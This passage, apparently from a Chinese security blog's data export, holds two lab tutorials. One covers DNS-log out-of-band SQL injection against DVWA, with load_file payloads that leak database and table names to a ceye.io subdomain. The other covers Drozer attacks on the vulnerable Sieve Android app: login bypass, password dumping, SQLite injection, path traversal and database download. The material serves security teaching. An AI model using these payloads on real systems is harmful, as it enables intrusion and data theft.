src=\"/images/DNS_Log/ns.png\"></p>\n<p>3、回到终端中可以获取DNS查询数据</p>\n<p><img src=\"/images/DNS_Log/ceye2.png\"></p>\n<h4 id=\"HTTP带外信道检测\"><a href=\"#HTTP带外信道检测\" class=\"headerlink\" title=\"HTTP带外信道检测\"></a>HTTP带外信道检测</h4><p>可以通过终端或浏览器方式进行HTTP请求目标主机,并携带DNS的三级域名获取返回数据包信息.</p>\n<p><img src=\"/images/DNS_Log/curl.png\"></p>\n<p><img src=\"/images/DNS_Log/ceye3.png\"></p>\n<h2 id=\"DNS-Log-Injection实战\"><a href=\"#DNS-Log-Injection实战\" class=\"headerlink\" title=\"DNS Log Injection实战\"></a>DNS Log Injection实战</h2><h3 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h3><ol>\n<li>MAMP集成环境</li>\n<li>DVWA源码</li>\n<li>CEYE.io平台</li>\n<li>火狐/Chrome及Hackbar插件</li>\n<li>Burp Suite1.7.30</li>\n</ol>\n<h3 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h3><p>0x1:环境搭建部分省略</p>\n<p>环境搭建部分可以直接参考网上即可,这里不做介绍.</p>\n<p>0x2:URL访问</p>\n<p>键入id=1时会输出id存在数据库中.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;1&amp;Submit&#x3D;%C3%A6%C2%8F%C2%90%C3%A4%C2%BA%C2%A4#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa.png\"></p>\n<p>0x3:单引号测试</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;1%27&amp;Submit&#x3D;%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90% C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa1.png\"></p>\n<p>0x4:无报错信息</p>\n<p>可能无法判断是否存在注入(实际中不会有类似黑色部分提醒),后续判断是否存在注入，通过sleep判断服务器是否存在访问延迟,如果存在,说明存在盲注(这里可以参考之前发的SQL Inject Cheat sheet).</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;1%27%20and%20sleep(10)--+&amp;Submit&#x3D;%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90 %C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa2.png\"></p>\n<p>0x5:其他手工检测</p>\n<p>在介绍SQL的时候我们知道可以通过ascii、substr等函数进行一个一个字符进行判断,但,我们知道那样效率太低.</p>\n<p>如:判断数据库中第一张表的第一个字符的ascii码:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and ascii(substr((<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">&#x27;dvwa&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))=<span class=\"number\">103</span><span class=\"comment\">--+&amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa3.png\"></p>\n<p>0x6:DNS Log检测</p>\n<p>登录平台,清理DNS Query查询</p>\n<p><img src=\"/images/DNS_Log/ceye4.png\"></p>\n<p>0x7:构造payload</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and if((<span class=\"keyword\">select</span> <span class=\"keyword\">load_file</span>(<span class=\"keyword\">concat</span>(<span class=\"string\">&#x27;\\\\\\\\&#x27;</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">database</span>()),<span class=\"string\">&#x27;.u7tu9q.ceye.io\\\\abc&#x27;</span>))),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"comment\">--+ URL:id=1&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.u7tu9q.ceye.io\\\\abc&#x27;))),1,1)--+ &amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa4.png\"></p>\n<p>0x8:查询结果</p>\n<p>如下图得知:</p>\n<p><img src=\"/images/DNS_Log/ceye5.png\"></p>\n<p>0x9:其他payload</p>\n<p>获取信息可以通过修改常规注入时payload一致.</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and if((<span class=\"keyword\">select</span> <span class=\"keyword\">load_file</span>(<span class=\"keyword\">concat</span>(<span class=\"string\">&#x27;\\\\\\\\&#x27;</span>,(<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">&quot;dvwa&quot;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"string\">&#x27;.u7tu9q.ceye.io\\\\abc&#x27;</span>))),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"comment\">--+ &amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa5.png\"></p>\n<p><img src=\"/images/DNS_Log/ceye6.png\"></p>\n<p>0x10:其他</p>\n<p>其他payload不一一测试,可自行测试.</p>\n<h3 id=\"英文参考\"><a href=\"#英文参考\" class=\"headerlink\" title=\"英文参考\"></a>英文参考</h3><p>英文版的相关介绍可参考以下pdf文件,自行下载查阅.</p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/DNSLogSQLInjection.pdf\">DNS_Log_Injection</a></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.seceye.cn&#x2F;710.html</span><br><span class=\"line\">http:&#x2F;&#x2F;byd.dropsec.xyz&#x2F;2016&#x2F;12&#x2F;04&#x2F;dnslog%E5%88%A9%E7%94%A8&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;bbs.ichunqiu.com&#x2F;thread-22002-1-1.html</span><br><span class=\"line\">https:&#x2F;&#x2F;ricterz.me&#x2F;posts&#x2F;%E7%AC%94%E8%AE%B0:%20D ata%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<p>注入类漏洞我们都了解,比如之前整理SQL Injection时介绍和说明的一样,而今天学习的DNS Log 注入通过名称我们应该也知道,是利用DNS来完成的带外注入的攻击手段,而这些又如何实现的呢?一起慢慢来学习分析.</p>\n<h2 id=\"DNS定义\"><a href=\"#DNS定义\" class=\"headerlink\" title=\"DNS定义\"></a>DNS定义</h2><h3 id=\"DNS介绍\"><a href=\"#DNS介绍\" class=\"headerlink\" title=\"DNS介绍\"></a>DNS介绍</h3><p>DNS(Domain Name System，域名系统),它使用层次结构的命名系统,因特网上作为域名和IP地址相互映射的一个分布式数据库系统,能够使用户更方便的访问互联网,而不用去记住能够被机器直接读取的IP数串.通过主机名,最终得到该主机名对应的IP地址的过程叫做域名解析(或主机名解析).DNS协议运行在UDP协议之上.服务器端工作在UDP协议端口53和TCP协议端口53上.</p>\n<p>下图是一个DNS解析模拟过程,其中IPV4对应的是客户端,主机存在对应IP地址,经过DNS解析后会找到对应我们想要访问的WEB应用服务器,从而获取我们想要的资源,后续将会继续介绍DNS的请求流程.</p>\n<p><img src=\"/images/DNS_Log/dns.png\"></p>\n<h3 id=\"DNS请求流程\"><a href=\"#DNS请求流程\" class=\"headerlink\" title=\"DNS请求流程\"></a>DNS请求流程</h3><p>DNS是应用层协议,事实上它是为其它应用层协议工作的,包括不限于HTTP和SMTP以及FTP,用于将用户提供的主机名解析为IP地址.</p>\n<p>具体过程如下:</p>\n<ol>\n<li>主机向本地域名服务器实行递归查询,如果本地无法查询域名对应的IP地址时,此时本地域名服务器就以DNS客户的身份,向其他根域名服务器继续发出查询请求报文(替主机继续查询),而不是让主机自己进行下一步查询.</li>\n<li>本地域名服务器向根域名服务器实现迭代查询,根域名服务器收到本地域名服务器发来的查询请求后,如果根域名服务器可以直接查询得到对应IP地址直接回复即可,如果此根域名服务器查询不到,那么它会告知本地域名服务器让它下一步请求哪一个根域名服务器.本地域名服务器获得下一步“指示”后去请求另一根域名服务器,直到获取请求中的域名对应IP地址,本地域名服务器获得IP后会告知开始请求的主机它请求域名对应IP地址,整个DNS查询基本完成.</li>\n<li>主机获得本地域名服务器回复的IP地址,就可以向该IP地址进行HTTP服务器发起TCP连接.</li>\n</ol>\n<h3 id=\"DNS体系结构\"><a href=\"#DNS体系结构\" class=\"headerlink\" title=\"DNS体系结构\"></a>DNS体系结构</h3><p>从用户主机上调用应用程序的角度看,DNS是一个提供简单、直接的转换服务的黑盒子.但事实上.实现这个服务的黑盒子非常复杂,它由分布于全球的大量DNS服务器以及定义了DNS服务器与查询主机通信方式的应用层协议组成.</p>\n<p>DNS的一种简单的设计模式就是在因特网上只使用一个DNS服务器,该服务器包含所有的映射,在这种集中式的设计中,客户机直接将所有查询请求发往单一的DNS服务器,同时该DNS服务器直接对所有查询客户机做出响应,尽管这种设计方式非常诱人.</p>\n<p>但他不适用当前的互联网,因为当今的因特网有着数量巨大并且在持续增长的主机,这种集中式设计会有单点故障,通信容量(上亿台主机发送的查询DNS报文请求,包括但不限于所有的HTTP请求,电子邮件报文服务器,TCP长连接服务),远距离的时间延迟,维护开销大(因为所有的主机名-ip映射都要在一个服务站点更新)等问题.</p>\n<p>DNS服务器一般分三种,根DNS服务器,顶级DNS服务器,权威DNS服务器.使用分布式的层次数据库模式以及缓存方法来解决单点集中式的问题.</p>\n<p>DNS 域名称:</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">DNS域名</th>\n<th align=\"center\">组织类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">gov</td>\n<td align=\"center\">非军事政府机构(政府)</td>\n</tr>\n<tr>\n<td align=\"center\">mil</td>\n<td align=\"center\">军事政府机构</td>\n</tr>\n<tr>\n<td align=\"center\">edu</td>\n<td align=\"center\">教育机构</td>\n</tr>\n<tr>\n<td align=\"center\">com</td>\n<td align=\"center\">商业公司</td>\n</tr>\n<tr>\n<td align=\"center\">net</td>\n<td align=\"center\">网络公司</td>\n</tr>\n<tr>\n<td align=\"center\">…</td>\n<td align=\"center\">…</td>\n</tr>\n</tbody></table>\n<p>客户机上用nslookup命令查询一下 <code>www.test3.com</code>,马上可以看到本地DNS服务器(192.168.88.10)直接查全球13台根域中的某几台,然后一步步解析,通过迭代的方式,直到找到 <code>www.test3.com</code>对应的IP为68.178.213.61.本地DNS服务器得到test3域的IP后,它把这个IP返回给192.168.88.126客户机,完成解析.</p>\n<p><img src=\"/images/DNS_Log/Wireshark.png\"></p>\n<center>Wireshark检测截图</center>\n\n<h3 id=\"DNS的重要性\"><a href=\"#DNS的重要性\" class=\"headerlink\" title=\"DNS的重要性\"></a>DNS的重要性</h3><p>这13台根服务器可以指挥浏览器(比如.internet explorer)和电子邮件程序(比如.Firefox)以控制互联网通信.由于根服务器中有经美国政府批准的260个左右的互联网后缀(如．com、．net等)和一些国家的指定符.</p>\n<p>曾经一位互联网资深专家解释说,美国控制了域名解析的根服务器,也就控制了相应的所有域名,如果美国不想让人访问某些域名,就可以屏蔽掉这些域名,使它们的IP地址无法解析出来,那么这些域名所指向的网站就相当于从互联网的世界中消失了.比如:2004年4月,由于“.ly”域名瘫痪,导致利比亚从互联网上消失了3天.</p>\n<h3 id=\"DNS攻击中应用\"><a href=\"#DNS攻击中应用\" class=\"headerlink\" title=\"DNS攻击中应用\"></a>DNS攻击中应用</h3><p>以上已经了解了DNS整个流程,但是DNS如何利用到攻击中呢?而上面也已经介绍了DNS整个过程并不存在可利用的攻击,除非运营商进行DNS劫持去发发广告之类的事情.</p>\n<p>但我们知道在SQL注入中有一种姿势是延迟注入(时间延迟)来判断注入以及其他敏感数据信息.但,我们知道延迟注入非常费时不容易被发现,所以现在有种方式可以解决此类无法直接显示报错/查询结果的一种攻击方式,DNS Log注入可以满足这一姿势.</p>\n<h2 id=\"ceye-io介绍\"><a href=\"#ceye-io介绍\" class=\"headerlink\" title=\"ceye.io介绍\"></a>ceye.io介绍</h2><p>在进行介绍DNS Log注入之前我们又不得不介绍下一个带外工具,那就是大家熟知的一个平台:ceye.</p>\n<h3 id=\"ceye-io作用\"><a href=\"#ceye-io作用\" class=\"headerlink\" title=\"ceye.io作用\"></a>ceye.io作用</h3><p>CEYE是一个用来检测带外(Out-of-Band)流量的监控平台,如DNS查询和HTTP请求.它可以帮助安全研究人员在测试漏洞时收集信息(例如SSRF/XXE/RFI/RCE等),具体的介绍可以参考ceye的官网介绍.</p>\n<h3 id=\"产生背景\"><a href=\"#产生背景\" class=\"headerlink\" title=\"产生背景\"></a>产生背景</h3><p>漏洞检测或漏洞利用需要进一步完成用户或系统交互,一些漏洞类型没有直接表明(回显)攻击是否成功;如Payload触发了却不在前端页面显示.为了解决这个问题,于是就开发了CEYE平台.通过使用诸如DNS和HTTP之类的带外信道,便可以得到回显信息.</p>\n<h3 id=\"如何使用\"><a href=\"#如何使用\" class=\"headerlink\" title=\"如何使用\"></a>如何使用</h3><p>登录ceye.io,在用户详情页可以看到自己的域名标识符 identifier,对于每个用户,都有唯一的域名标识符如:abcdef.ceye.io,所有来自于abcdef.ceye.io或*.abcdef.ceye.io的DNS查询和HTTP请求都会被记录.通过查看这些记录信息,安全研究人员可以确认并改进自己的漏洞研究方案(其他使用参考官网使用手册).</p>\n<p>注册后会分配identifier</p>\n<p><img src=\"/images/DNS_Log/ceye.png\"></p>\n<h4 id=\"DNS带外信道检测-Blind-Payload-流程\"><a href=\"#DNS带外信道检测-Blind-Payload-流程\" class=\"headerlink\" title=\"DNS带外信道检测 Blind Payload 流程\"></a>DNS带外信道检测 Blind Payload 流程</h4><p><img src=\"/images/DNS_Log/dns_out.png\"></p>\n<center>DNS Log带外注入一般流程</center>\n\n<h4 id=\"本地测试\"><a href=\"#本地测试\" class=\"headerlink\" title=\"本地测试\"></a>本地测试</h4><p>通过上面我们已经注册了ceye并生成了一个三级域名.</p>\n<p>1、首先到profile中添加需要解析的DNS服务器地址,可以添加多个</p>\n<p><img src=\"/images/DNS_Log/ceye1.png\"></p>\n<p>2、在终端中输入</p>\n<p>nslookup test.u7tu9q.ceye.io</p>\n<p><img src=\"/images/DNS_Log/ns.png\"></p>\n<p>3、回到终端中可以获取DNS查询数据</p>\n<p><img src=\"/images/DNS_Log/ceye2.png\"></p>\n<h4 id=\"HTTP带外信道检测\"><a href=\"#HTTP带外信道检测\" class=\"headerlink\" title=\"HTTP带外信道检测\"></a>HTTP带外信道检测</h4><p>可以通过终端或浏览器方式进行HTTP请求目标主机,并携带DNS的三级域名获取返回数据包信息.</p>\n<p><img src=\"/images/DNS_Log/curl.png\"></p>\n<p><img src=\"/images/DNS_Log/ceye3.png\"></p>\n<h2 id=\"DNS-Log-Injection实战\"><a href=\"#DNS-Log-Injection实战\" class=\"headerlink\" title=\"DNS Log Injection实战\"></a>DNS Log Injection实战</h2><h3 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h3><ol>\n<li>MAMP集成环境</li>\n<li>DVWA源码</li>\n<li>CEYE.io平台</li>\n<li>火狐/Chrome及Hackbar插件</li>\n<li>Burp Suite1.7.30</li>\n</ol>\n<h3 id=\"Start\"><a href=\"#Start\" class=\"headerlink\" title=\"Start\"></a>Start</h3><p>0x1:环境搭建部分省略</p>\n<p>环境搭建部分可以直接参考网上即可,这里不做介绍.</p>\n<p>0x2:URL访问</p>\n<p>键入id=1时会输出id存在数据库中.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;1&amp;Submit&#x3D;%C3%A6%C2%8F%C2%90%C3%A4%C2%BA%C2%A4#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa.png\"></p>\n<p>0x3:单引号测试</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;1%27&amp;Submit&#x3D;%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90% C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa1.png\"></p>\n<p>0x4:无报错信息</p>\n<p>可能无法判断是否存在注入(实际中不会有类似黑色部分提醒),后续判断是否存在注入，通过sleep判断服务器是否存在访问延迟,如果存在,说明存在盲注(这里可以参考之前发的SQL Inject Cheat sheet).</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id&#x3D;1%27%20and%20sleep(10)--+&amp;Submit&#x3D;%C3%83%C2%A6%C3%82%C2%8F%C3%82%C2%90 %C3%83%C2%A4%C3%82%C2%BA%C3%82%C2%A4#</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa2.png\"></p>\n<p>0x5:其他手工检测</p>\n<p>在介绍SQL的时候我们知道可以通过ascii、substr等函数进行一个一个字符进行判断,但,我们知道那样效率太低.</p>\n<p>如:判断数据库中第一张表的第一个字符的ascii码:</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and ascii(substr((<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">&#x27;dvwa&#x27;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"number\">1</span>,<span class=\"number\">1</span>))=<span class=\"number\">103</span><span class=\"comment\">--+&amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa3.png\"></p>\n<p>0x6:DNS Log检测</p>\n<p>登录平台,清理DNS Query查询</p>\n<p><img src=\"/images/DNS_Log/ceye4.png\"></p>\n<p>0x7:构造payload</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and if((<span class=\"keyword\">select</span> <span class=\"keyword\">load_file</span>(<span class=\"keyword\">concat</span>(<span class=\"string\">&#x27;\\\\\\\\&#x27;</span>,(<span class=\"keyword\">select</span> <span class=\"keyword\">database</span>()),<span class=\"string\">&#x27;.u7tu9q.ceye.io\\\\abc&#x27;</span>))),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"comment\">--+ URL:id=1&#x27; and if((select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.u7tu9q.ceye.io\\\\abc&#x27;))),1,1)--+ &amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa4.png\"></p>\n<p>0x8:查询结果</p>\n<p>如下图得知:</p>\n<p><img src=\"/images/DNS_Log/ceye5.png\"></p>\n<p>0x9:其他payload</p>\n<p>获取信息可以通过修改常规注入时payload一致.</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">id=1&#x27; and if((<span class=\"keyword\">select</span> <span class=\"keyword\">load_file</span>(<span class=\"keyword\">concat</span>(<span class=\"string\">&#x27;\\\\\\\\&#x27;</span>,(<span class=\"keyword\">select</span> table_name <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema=<span class=\"string\">&quot;dvwa&quot;</span> <span class=\"keyword\">limit</span> <span class=\"number\">0</span>,<span class=\"number\">1</span>),<span class=\"string\">&#x27;.u7tu9q.ceye.io\\\\abc&#x27;</span>))),<span class=\"number\">1</span>,<span class=\"number\">1</span>)<span class=\"comment\">--+ &amp;Submit=Ã¦ÂÂÃ¤ÂºÂ¤#</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/DNS_Log/dvwa5.png\"></p>\n<p><img src=\"/images/DNS_Log/ceye6.png\"></p>\n<p>0x10:其他</p>\n<p>其他payload不一一测试,可自行测试.</p>\n<h3 id=\"英文参考\"><a href=\"#英文参考\" class=\"headerlink\" title=\"英文参考\"></a>英文参考</h3><p>英文版的相关介绍可参考以下pdf文件,自行下载查阅.</p>\n<p><a href=\"http://www.si1ent.xyz/ziliao/DNSLogSQLInjection.pdf\">DNS_Log_Injection</a></p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.seceye.cn&#x2F;710.html</span><br><span class=\"line\">http:&#x2F;&#x2F;byd.dropsec.xyz&#x2F;2016&#x2F;12&#x2F;04&#x2F;dnslog%E5%88%A9%E7%94%A8&#x2F;</span><br><span class=\"line\">https:&#x2F;&#x2F;bbs.ichunqiu.com&#x2F;thread-22002-1-1.html</span><br><span class=\"line\">https:&#x2F;&#x2F;ricterz.me&#x2F;posts&#x2F;%E7%AC%94%E8%AE%B0:%20D ata%20Retrieval%20over%20DNS%20in%20SQL%20Injection%20Attacks</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Drozer检测学习","date":"2020-06-20T14:40:04.000Z","_content":"Drozer是MWR Labs开发的一款针对Android系统的综合安全测试框架。Drozer可以通过与Dalivik 虚拟机,以及其它应用程序的IPC端点以及底层操作系统的交互，避免正处于开发阶段，或者部署于你的组织的android应用程序和设备暴露出不可接受的安全风险。\n\n#### 环境配置\n\n```\nJDK\npython\nAndroid SDK\nadb\ndrozer-agent(安装至Android)\ndrozer(PC端)\nsieve.apk\nfourgoats.apk\n```\n\n#### 组件及描述\n\n![image-20200628111010674](/images/drozer/image-20200628111010674.png)\n\n<center>部分组件概述</center>\n\n### 环境部署\n\ndrozer部署\n\n[drozer(PC端)下载](https://github.com/mwrlabs/drozer/releases/)\n\n[drozer(客户端)下载](http://www.si1ent.xyz/Tools/drozer-agent-2.3.4.apk)\n\n安装参考网上.\n\n#### sieve\n\n[sieve](http://www.si1ent.xyz/Tools/sieve.apk)\n\nSieve是一个小型的Password Manager应用程序，用于展示Android中的一些常见漏洞应用。\n首次启动Sieve时，它要求用户设置一个16个字符的“主密码”和一个4位数的引脚，用于保护用户稍后输入的密码。 用户可以使用Sieve存储各种服务的密码，如果需要正确的凭据，可以在以后检索。\n\n#### Vul_Broadcast\n\n[Vul_Broadcast](http://www.si1ent.xyz/Tools/Vul_BroadcastReceiver.apk)\n\nVul_Broadcast是一款专门用于检测Broadcast组件安全性而设计的APP程序。\n\n#### fourgoats\n\n[fourgoats](http://www.si1ent/xyz/Tools/goatdroid.apk)\n\nfourgoats是OWASP项目内一款模拟检测Broadcast组件安全性，同时也存在WebView代码执行漏洞等。\n\n### 检测实战\n\n以下检测因部分APP内并不都存在可导出的组件信息，所以结合网络上的APK分别测试不同组件产生的危害。\n\n#### 0、连接\n\n```shell\n手机提前开启调试模式\nadb forward tcp:31415 tcp:31415\n31415\n//查看连接(如下表示连接正常)\nadb devices\nList of devices attached\n9SQ4Y9FU99999999\tdevice\n//drozer连接\ndrozer console connect\n```\n\n![image-20200628144434578](/images/drozer/image-20200628144434578.png)\n\n#### 1、包名检测\n\n```shell\ndz> run app.package.list\n```\n\n![image-20200628144457885](/images/drozer/image-20200628144457885.png)\n\n<center>部分APP</center>\n\n\n#### 2、sieve实例\n\n因Android内包名是唯一标识，所以可根据名称进行检索\n\n```shell\ndz> run app.package.list -f sieve\n```\n\n![image-20200628144824371](/images/drozer/image-20200628144824371.png)\n\n#### 3、APP信息\n\n```shell\ndz> run app.package.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\n  Application Label: Sieve\n  Process Name: com.mwr.example.sieve\n  Version: 1.0\n  Data Directory: /data/data/com.mwr.example.sieve\n  APK Path: /data/app/com.mwr.example.sieve-1/base.apk\n  UID: 10104\n  GID: [1028, 1015, 3003]\n  Shared Libraries: null\n  Shared User ID: null\n  Uses Permissions:\n  - android.permission.READ_EXTERNAL_STORAGE\n  - android.permission.WRITE_EXTERNAL_STORAGE\n  - android.permission.INTERNET\n  Defines Permissions:\n  - com.mwr.example.sieve.READ_KEYS\n  - com.mwr.example.sieve.WRITE_KEYS\n```\n\n![image-20200628144936720](/images/drozer/image-20200628144936720.png)\n\n#### 4、漏洞检测\n\n```shell\ndz> run app.package.attacksurface com.mwr.example.sieve\nAttack Surface:\n  3 activities exported\n  0 broadcast receivers exported\n  2 content providers exported\n  2 services exported\n    is debuggable\n```\n\n![image-20200628145213646](/images/drozer/image-20200628145213646.png)\n\n#### 5、Activities\n\nActivities组件是Android新建APP每个功能均会存在的Activities页面；同样如果未对某些页面作限制可能导致绕过登录入口而进入某功能。\n\n```shell\ndz> run app.activity.info -a com.mwr.example.sieve\nPackage: com.mwr.example.sieve\n  com.mwr.example.sieve.FileSelectActivity\n    Permission: null\n  com.mwr.example.sieve.MainLoginActivity\n    Permission: null\n  com.mwr.example.sieve.PWList\t//可倒出，未设置权限认证\n    Permission: null\n```\n\n![image-20200628145406392](/images/drozer/image-20200628145406392.png)\n\n#### 6、Activities攻击\n\n```shell\n//会直接绕过登录,进入密码添加.\ndz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList\n```\n\n![image-20200628145915024](/images/drozer/image-20200628145915024.png)\n\n#### 7、ContentProvider\n\nAndroid平台提供了Content Provider使一个应用程序的指定数据集提供给其他应用程序。这些数据可以存储在文件系统中、在一个SQLite数据库、或以任何其他合理的方式。其他应用可以通过ContentResolver类从该内容提供者中获取或存入数据。只有需要在多个应用程序间共享数据是才需要内容提供者。\n\n\n\n```shell\ndz> run scanner.provider.finduris -a com.mwr.example.sieve\n```\n\n![image-20200628151122062](/images/drozer/image-20200628151122062.png)\n\n<center>Able to Query可查询数据</center>\n\n#### 8、ContentProvider攻击\n\n```shell\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/\n或\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical\n```\n\n![image-20200628152212737](/images/drozer/image-20200628152212737.png)\n\n<center>如上数据泄露</center>\n\n##### 8.1、SQL注入\n\nAndroid使用SQLite来存储数据，也可能造成SQL注入漏洞。\n\n```powershell\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"'\"\t\t\t//提交单引号测试(如下报错)\nunrecognized token: \"' FROM Passwords\" (code 1): , while compiling: SELECT ' FROM Passwords\n```\n\n![image-20200628152803161](/images/drozer/image-20200628152803161.png)\n\n```shell\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection \"'\"\nunrecognized token: \"')\" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')\n```\n\n```shell\n列出数据库中所有表及相关结构信息\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"* FROM SQLITE_MASTER WHERE type='table';–\"\n```\n\n![image-20200628153216874](/images/drozer/image-20200628153216874.png)\n\n```shell\n查询其他表\ndz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection \"* FROM Key;–\"\n```\n\n![image-20200628153439019](/images/drozer/image-20200628153439019.png)\n\n\n\n##### 8.2、目录遍历\n\n```shell\n//检测存在目录遍历\ndz> run scanner.provider.traversal -a com.mwr.example.sieve\n```\n\n![image-20200628154719291](/images/drozer/image-20200628154719291.png)\n\n\n\n##### 8.3、读取敏感信息\n\n```shell\n//读取手机内信息\nrun app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts\n```\n\n![image-20200628155031780](/images/drozer/image-20200628155031780.png)\n\n```shell\n//下载文件到本地\nrun app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db ./database.db\n```\n\n![image-20200628155519778](/images/drozer/image-20200628155519778.png)\n\n```shell\n下载是sqlite文件并保存有主密码\n```\n\n![image-20200628155856692](/images/drozer/image-20200628155856692.png)\n\n\n\n##### 